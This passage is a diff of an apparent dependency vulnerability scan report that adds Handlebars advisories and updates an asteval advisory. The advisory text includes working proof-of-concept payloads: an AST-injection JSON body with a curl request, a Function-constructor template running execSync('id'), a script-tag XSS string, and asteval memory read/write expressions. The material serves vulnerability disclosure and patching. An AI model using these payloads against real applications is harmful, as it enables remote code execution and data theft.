@@ -1183,157 +1183,7 @@
             "name": "click",
             "version": "8.2.1",
             "ecosystem": "PyPI"
-          },
-          "groups": [
-            {
-              "ids": [
-                "PYSEC-2026-2132"
-              ],
-              "aliases": [
-                "CVE-2026-7246",
-                "GHSA-47fr-3ffg-hgmw",
-                "PYSEC-2026-2132"
-              ],
-              "max_severity": "7.2"
-            }
-          ],
-          "vulnerabilities": [
-            {
-              "affected": [
-                {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/click/PYSEC-2026-2132.yaml"
-                  },
-                  "ecosystem_specific": {},
-                  "package": {
-                    "ecosystem": "PyPI",
-                    "name": "click",
-                    "purl": "pkg:pypi/click"
-                  },
-                  "ranges": [
-                    {
-                      "events": [
-                        {
-                          "introduced": "0"
-                        },
-                        {
-                          "fixed": "8.3.3"
-                        }
-                      ],
-                      "type": "ECOSYSTEM"
-                    }
-                  ],
-                  "versions": [
-                    "0.1",
-                    "0.2",
-                    "0.3",
-                    "0.4",
-                    "0.5",
-                    "0.5.1",
-                    "0.6",
-                    "0.7",
-                    "1.0",
-                    "1.1",
-                    "2.0",
-                    "2.1",
-                    "2.2",
-                    "2.3",
-                    "2.4",
-                    "2.5",
-                    "2.6",
-                    "3.0",
-                    "3.1",
-                    "3.2",
-                    "3.3",
-                    "4.0",
-                    "4.1",
-                    "5.0",
-                    "5.1",
-                    "6.0",
-                    "6.1",
-                    "6.2",
-                    "6.3",
-                    "6.4",
-                    "6.5",
-                    "6.6",
-                    "6.7",
-                    "6.7.dev0",
-                    "7.0",
-                    "7.1",
-                    "7.1.1",
-                    "7.1.2",
-                    "8.0.0",
-                    "8.0.0a1",
-                    "8.0.0rc1",
-                    "8.0.1",
-                    "8.0.2",
-                    "8.0.3",
-                    "8.0.4",
-                    "8.1.0",
-                    "8.1.1",
-                    "8.1.2",
-                    "8.1.3",
-                    "8.1.4",
-                    "8.1.5",
-                    "8.1.6",
-                    "8.1.7",
-                    "8.1.8",
-                    "8.2.0",
-                    "8.2.1",
-                    "8.2.2",
-                    "8.3.0",
-                    "8.3.1",
-                    "8.3.2"
-                  ]
-                }
-              ],
-              "aliases": [
-                "CVE-2026-7246",
-                "GHSA-47fr-3ffg-hgmw"
-              ],
-              "details": "Pallets Click, versions 8.3.2 and below, contain a command injection vulnerability in the click.edit() function, allowing attackers to pass arbitrary OS commands from an unprivileged account.",
-              "id": "PYSEC-2026-2132",
-              "modified": "2026-07-13T07:15:21.899333658Z",
-              "published": "2026-04-30T14:16:36.433Z",
-              "references": [
-                {
-                  "type": "WEB",
-                  "url": "https://access.redhat.com/security/cve/CVE-2026-7246"
-                },
-                {
-                  "type": "WEB",
-                  "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-7246.json"
-                },
-                {
-                  "type": "ADVISORY",
-                  "url": "https://access.redhat.com/errata/RHSA-2026:24761"
-                },
-                {
-                  "type": "ADVISORY",
-                  "url": "https://access.redhat.com/errata/RHSA-2026:24762"
-                },
-                {
-                  "type": "REPORT",
-                  "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2464121"
-                },
-                {
-                  "type": "FIX",
-                  "url": "https://github.com/pallets/click/releases/tag/8.3.3"
-                },
-                {
-                  "type": "EVIDENCE",
-                  "url": "https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw"
-                }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
-                  "type": "CVSS_V3"
-                }
-              ]
-            }
-          ]
+          }
         },
         {
           "package": {
@@ -45585,7 +45435,277 @@
             "name": "handlebars",
             "version": "4.7.9",
             "ecosystem": "npm"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-8r5x-fm3f-whwj"
+              ],
+              "aliases": [
+                "CVE-2026-106446",
+                "GHSA-8r5x-fm3f-whwj"
+              ],
+              "max_severity": "9.8"
+            },
+            {
+              "ids": [
+                "GHSA-p8wg-vrv2-v86f"
+              ],
+              "aliases": [
+                "CVE-2026-106445",
+                "GHSA-p8wg-vrv2-v86f"
+              ],
+              "max_severity": "9.2"
+            },
+            {
+              "ids": [
+                "GHSA-xw65-4hp5-5hc7"
+              ],
+              "aliases": [
+                "CVE-2026-106444",
+                "GHSA-xw65-4hp5-5hc7"
+              ],
+              "max_severity": "4.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.7.9",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-8r5x-fm3f-whwj/GHSA-8r5x-fm3f-whwj.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "handlebars",
+                    "purl": "pkg:npm/handlebars"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.7.10"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-106446"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-843",
+                  "CWE-94"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-08T17:52:32Z",
+                "nvd_published_at": "2026-10-06T20:17:26Z",
+                "severity": "CRITICAL"
+              },
+              "details": "## Summary\n\n`Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\nIf an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\nApplications that only ever pass template **strings** are not affected.\n\nThis bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\n## Details\n\nThe 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\n| AST value | Written into generated code as | Compile options needed |\n| --- | --- | --- |\n| `Program.blockParams.length` | `container.program(\u003cindex\u003e, data, \u003clength\u003e)` | none (default options) |\n| `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[\u003cdepth\u003e]` | `stringParams: true` |\n| A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n| A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\nThe first row works with default options. A `Program` with `blockParams: { \"length\": \"\u003cJS expression\u003e\" }` passes validation because:\n\n1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n2. the walker skips the string under `length` because it is not an object.\n\nThe compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\n## Proof of Concept\n\n1. Start a server that compiles request input:\n\n```js\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) =\u003e {\n  const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n  res.send(template());\n});\n\napp.listen(2123);\n```\n\n2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\n```json\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } },\n    \"body\": [\n      {\n        \"type\": \"BlockStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n          \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"params\": [],\n        \"program\": {\n          \"type\": \"Program\",\n          \"blockParams\": {\n            \"length\": \"(()=\u003e{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n          },\n          \"body\": [],\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"openStrip\": { \"open\": false, \"close\": false },\n        \"inverseStrip\": { \"open\": false, \"close\": false },\n        \"closeStrip\": { \"open\": false, \"close\": false },\n        \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n      }\n    ]\n  }\n}\n```\n\n3. Send the request:\n\n```sh\ncurl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n     -H 'Content-Type: application/json' --data-binary @poc.json\n```\n\nThe server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\n```\nError: Injected code ran as uid 1000\n```\n\n## Impact\n\nAn application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\n- **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n- **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\n## Credits\n\n### Variant `Program.blockParams`\n- [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n- [jmoritzc53 ](https://github.com/jmoritzc53)\n- [bhaswanthc ](https://github.com/bhaswanthc)\n- [dinhvaren ](https://github.com/dinhvaren)\n- [n0tra4e ](https://github.com/n0tra4e) \n- [PellaML](https://github.com/PellaML)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [sanmatte](https://github.com/sanmatte)\n\n### Variant `BooleanLiteral|NumberLiteral.value`\n\n- [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R\u0026D)\n- [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n- [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n- [vk-can](https://github.com/vk-can)\n- [shenhuanageshei](https://github.com/shenhuanageshei)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [ffasterss](https://github.com/ffasterss)\n\n### Variant `PathExpression.depth`\n\n- [hibrian827](https://github.com/hibrian827) Team Atlanta\n- [oss-security-shopify](https://github.com/oss-security-shopify)",
+              "id": "GHSA-8r5x-fm3f-whwj",
+              "modified": "2026-10-08T18:00:08.902906060Z",
+              "published": "2026-10-08T17:52:32Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106446"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/pull/2185"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/handlebars-lang/handlebars.js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.7.9",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-p8wg-vrv2-v86f/GHSA-p8wg-vrv2-v86f.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "handlebars",
+                    "purl": "pkg:npm/handlebars"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "4.7.10"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-106445"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1289",
+                  "CWE-184"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-08T17:52:26Z",
+                "nvd_published_at": "2026-10-06T20:17:26Z",
+                "severity": "CRITICAL"
+              },
+              "details": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.\n\nIf you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version.",
+              "id": "GHSA-p8wg-vrv2-v86f",
+              "modified": "2026-10-12T14:45:06.527043960Z",
+              "published": "2026-10-08T17:52:26Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-p8wg-vrv2-v86f"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106445"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/pull/2185"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/commit/ceec388abe1d1aac8f6369860d5f390fa71ef4fa"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/handlebars-lang/handlebars.js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Handlebars: JavaScript Injection via Own Property Check Bypass"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.7.9",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-xw65-4hp5-5hc7/GHSA-xw65-4hp5-5hc7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "handlebars",
+                    "purl": "pkg:npm/handlebars"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.7.10"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-106444"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-116"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-08T17:52:37Z",
+                "nvd_published_at": "2026-10-06T20:17:26Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n\n`Handlebars.precompile()` generates JavaScript source that is commonly embedded in browser `\u003cscript\u003e` elements. Before the fix, static template text containing `\u003c/script\u003e` was emitted unchanged. HTML parsers recognize `\u003c/script\u003e` even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.\n\nThis affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML `\u003cscript\u003e` element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.\n\n## Details\n\nStatic text is serialized by `quotedString()` in `lib/handlebars/compiler/code-gen.js`. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence `\u003c/script\u003e` terminates the element regardless of JavaScript string context.\n\nOn affected releases, this template:\n\n```handlebars\nsafe\u003c/script\u003e\u003cscript\u003ealert(\"XSS\")\u003c/script\u003e\u003cscript\u003e\n```\n\ncould produce generated source containing:\n\n```js\nreturn 'safe\u003c/script\u003e\u003cscript\u003ealert(\"XSS\")\u003c/script\u003e\u003cscript\u003e';\n```\n\nWhen included inline in an HTML document, the first `\u003c/script\u003e` closes the script containing the precompiled template. The next `\u003cscript\u003e` element is then parsed as HTML and executes.\n\n## Proof of Concept\n\n```js\nconst Handlebars = require('handlebars');\n\nconst template = 'safe\u003c/script\u003e\u003cscript\u003ealert(\"XSS\")\u003c/script\u003e\u003cscript\u003e';\nconst output = Handlebars.precompile(template);\n\nconsole.log(output.includes('\u003c/script\u003e'));\n```\n\nAffected versions print `true`. Embedding `output` directly in an inline `\u003cscript\u003e` element allows the injected script tag to be parsed by the browser.\n\n## Workarounds\n\n- Do not inline precompiled output from untrusted templates into HTML documents.\n- Serve generated precompiled templates as external JavaScript files where practical.\n\n## Credits\n\nReported by Curly-Haired-Baboon Aka Laplas",
+              "id": "GHSA-xw65-4hp5-5hc7",
+              "modified": "2026-10-08T18:00:09.713255773Z",
+              "published": "2026-10-08T17:52:37Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106444"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/pull/2185"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/handlebars-lang/handlebars.js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Handlebars: JavaScript Injection via Unsafe Inline Embedding of Precompiled Templates"
+            }
+          ]
         },
         {
           "package": {
@@ -66786,6 +66906,7 @@
                 "GHSA-9w56-46f6-3qhx"
               ],
               "aliases": [
+                "CVE-2026-102734",
                 "GHSA-9w56-46f6-3qhx"
               ],
               "max_severity": "5.5"
@@ -67104,6 +67225,9 @@
                   ]
                 }
               ],
+              "aliases": [
+                "CVE-2026-102734"
+              ],
               "database_specific": {
                 "cwe_ids": [
                   "CWE-693",
@@ -67117,7 +67241,7 @@
               },
               "details": "### Summary\nWith its default configuration (numpy enabled, `import` disabled), asteval's `Interpreter` lets an attacker-controlled expression obtain a raw **arbitrary process-memory read and write** primitive, without using `import`, any `__dunder__` attribute, or `eval`/`exec`/`getattr`. Arbitrary in-process read/write is equivalent to arbitrary code execution and is a complete escape of the sandbox whose entire purpose is \"untrusted string in, no arbitrary execution out.\" Any application that feeds untrusted input to asteval with numpy installed (the default) is affected.\n\n### Details\nasteval's attribute filter (`asteval/astutils.py: safe_getattr`) blocks every `__dunder__` name and blocks objects whose attribute value is *identity-equal* to one of the modules in `UNSAFE_MODULES = {io, os, sys, ctypes}`. The `ctypes` **module** entry was added recently (commit 9d9d430) and correctly blocks `ndarray.ctypes._ctypes`.\n\nHowever, the module check is identity-only against the ctypes *module*. It does not cover ctypes **type objects** and their metaclass methods, which are reachable through numpy's `ndarray.ctypes` wrapper using only ordinary (non-dunder) attribute names:\n\n    zeros(1, dtype=int32).ctypes.shape._type_      -\u003e  \u003cclass 'ctypes.c_long'\u003e\n\n`ndarray.ctypes` exposes `.shape` (a ctypes array) whose element type `._type_` is `ctypes.c_long`. None of `ctypes`, `.shape`, `._type_` is a dunder, none is in `UNSAFE_ATTRS`, and the returned value is a *type*, not the ctypes module, so `safe_getattr` permits all of them.\n\nOn that ctypes type, the metaclass method `from_address` is reachable (non-dunder, not in `UNSAFE_ATTRS`; it is not even listed by `dir()`, which is likely why it was missed):\n\n* **Arbitrary read:** `c_long.from_address(addr).value` reads 8 bytes at any address. `id()` (a permitted builtin) supplies arbitrary object addresses.\n* **Arbitrary write:** `cell = c_long.from_address(addr); cell.value = X` writes 8 bytes to any address. The write half rides asteval's **unfiltered `setattr`** in `Interpreter.node_assign` (the `ast.Attribute` branch performs `setattr(self.run(node.value), node.attr, val)` with no attribute-name check).\n\nRoot cause is two gaps:\n\n1. `safe_getattr` blocks the ctypes *module* but not ctypes *types* / metaclass methods (`from_address`, `from_buffer`, `from_buffer_copy`, `in_dll`, `from_param`) reachable via `ndarray.ctypes ... ._type_`.\n2. `node_assign` performs attribute writes (`setattr`) and deletes (`delattr`) with no attribute-name filtering.\n\nThis belongs to the known \"numpy is a large attack surface\" class (the docs already note `open()` read and `ndarray.tofile()` write), but this specific arbitrary memory read/write chain is undocumented and bypasses the most recent ctypes-module hardening. All previously reported escapes (CVE-2025-24359 / GHSA-3wwr-3g9f-9gc7, GHSA-vp47-9734-prjw, reduce/reduce_ex, classic `__subclasses__` traversal) are patched on the current code; this one is live.\n\n### PoC\nSelf contained POC here: https://gist.github.com/thegr1ffyn/16b67c5f9b5339a7e2bdc91423ff09e3\nEnvironment: `pip install asteval numpy` (verified on asteval 1.0.8, numpy 2.4.6, CPython 3.12.3; the chain is numpy-1.x/2.x robust). Default `Interpreter` (`use_numpy=True`, `import` disabled).\n\nMinimal one-expression arbitrary read (reads 8 bytes at an attacker-chosen address):\n\n    zeros(1,dtype=int32).ctypes.shape._type_.from_address(id(zeros(1))).value\n\nMinimal arbitrary write (writes 0x4142434445464748 to a chosen address; here our own array buffer, observed back through numpy):\n\n    a = zeros(2, dtype=int32)\n    cell = a.ctypes.shape._type_.from_address(a.ctypes.data)\n    cell.value = 0x4142434445464748        # -\u003e a[0]=0x45464748, a[1]=0x41424344\n\nA full self-contained script is attached (poc_asteval_ctypes.py); running it prints the recovered PyObject header of a private object (arbitrary read) and confirms a raw write landing at a chosen pointer (arbitrary write), all from a default, import-disabled interpreter.\n\n### Impact\nSandbox escape / protection-mechanism failure leading to arbitrary in-process native memory read and write (RCE-equivalent). Impact:\n\n* Disclosure of any data in the host process's address space (secrets, keys, other users' data).\n* Corruption of arbitrary memory -\u003e control-flow hijack / arbitrary code execution and/or process crash (DoS).\n\nAffected: any application that evaluates untrusted/attacker-influenced expressions with asteval while numpy is installed (the default). No authentication and no special configuration is required; `import` does not need to be enabled. Mitigation until patched: construct the interpreter with `use_numpy=False`.",
               "id": "GHSA-9w56-46f6-3qhx",
-              "modified": "2026-09-10T03:51:13.820374334Z",
+              "modified": "2026-10-14T02:56:19.430602789Z",
               "published": "2026-08-20T17:26:52Z",
               "references": [
                 {
@@ -99634,7 +99758,277 @@
             "name": "handlebars",
             "version": "4.7.9",
             "ecosystem": "npm"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-8r5x-fm3f-whwj"
+              ],
+              "aliases": [
+                "CVE-2026-106446",
+                "GHSA-8r5x-fm3f-whwj"
+              ],
+              "max_severity": "9.8"
+            },
+            {
+              "ids": [
+                "GHSA-p8wg-vrv2-v86f"
+              ],
+              "aliases": [
+                "CVE-2026-106445",
+                "GHSA-p8wg-vrv2-v86f"
+              ],
+              "max_severity": "9.2"
+            },
+            {
+              "ids": [
+                "GHSA-xw65-4hp5-5hc7"
+              ],
+              "aliases": [
+                "CVE-2026-106444",
+                "GHSA-xw65-4hp5-5hc7"
+              ],
+              "max_severity": "4.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.7.9",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-8r5x-fm3f-whwj/GHSA-8r5x-fm3f-whwj.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "handlebars",
+                    "purl": "pkg:npm/handlebars"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.7.10"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-106446"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-843",
+                  "CWE-94"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-08T17:52:32Z",
+                "nvd_published_at": "2026-10-06T20:17:26Z",
+                "severity": "CRITICAL"
+              },
+              "details": "## Summary\n\n`Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\nIf an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\nApplications that only ever pass template **strings** are not affected.\n\nThis bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\n## Details\n\nThe 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\n| AST value | Written into generated code as | Compile options needed |\n| --- | --- | --- |\n| `Program.blockParams.length` | `container.program(\u003cindex\u003e, data, \u003clength\u003e)` | none (default options) |\n| `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[\u003cdepth\u003e]` | `stringParams: true` |\n| A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n| A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\nThe first row works with default options. A `Program` with `blockParams: { \"length\": \"\u003cJS expression\u003e\" }` passes validation because:\n\n1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n2. the walker skips the string under `length` because it is not an object.\n\nThe compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\n## Proof of Concept\n\n1. Start a server that compiles request input:\n\n```js\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) =\u003e {\n  const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n  res.send(template());\n});\n\napp.listen(2123);\n```\n\n2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\n```json\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"loc\": { \"start\": { 